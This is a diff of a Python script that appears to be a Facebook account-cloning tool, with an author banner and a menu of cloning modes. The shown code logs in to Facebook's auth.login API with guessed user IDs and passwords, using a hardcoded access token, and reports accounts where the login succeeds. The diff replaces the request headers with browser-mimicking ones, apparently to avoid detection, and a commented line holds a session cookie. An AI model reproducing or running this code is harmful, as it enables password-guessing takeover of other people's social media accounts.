@@ -1,4 +1,5 @@
 
+
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
@@ -401,7 +402,7 @@ logo = """
 \x1b[1;97m[+] 𝗔𝗨𝗧𝗛𝗢𝗥  :   Adnan Ahmad Akhundzada 
 \x1b[1;97m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :  Adnan Ahmad Gomal  
 \x1b[1;97m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  ://github.com/AdnanAhmad2769ab
-\x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42  Adnan Ikram Shah   \33[0m
+\x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42  Adnan Friend of Ikram Shah   \33[0m
 \x1b[1;97m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 :\x1b[1;97m HANDSOME_Tribe Akhund  \x1b[1;97m          
 \x1b[1;97m--------------------------------------
 """
@@ -448,7 +449,7 @@ class Main:
 		print(" \033[1;32m[1]\033[0;92m ғɪʟᴇ ᴄʟᴏɴɪɴɢ ")
 		print(" \033[1;32m[2] ᴘᴜʙʟɪᴄ ᴄʟᴏɴɪɴɢ")
 		print(" \33[1;32m[3] ᴘᴀᴋ ʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ")
-		print(" \033[1;32m[4] clone nearby friends account ")
+		print(" \033[1;32m[4] clone old account  ")
 		print(" \33[1;32m[5] 2004 ᴛo 2008 ")
 		print("\033[1;32m [E] ᴇxɪᴛ \n")
 		UZAIR =input(" \033[1;32mᴄʜᴏᴏsᴇ : ")
@@ -1304,15 +1305,22 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=fTYUZKQYq49rAjgROIiocqiA; sb=fTYUZP-m4iu8N8ZsSfbqNDa3; fr=0bi2Z1fLMpR1fHnEf..BkFDaA.A1.AAA.0.0.BkFDb_.AWVS7GVnUDU',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-Adnan] %s | %s\033[0;32m         "%(uid, pw))
@@ -1338,4 +1346,3 @@ if len(sys.argv) == 2:
  
 try:Main()
 except Exception as e:exit(str(e))
- 
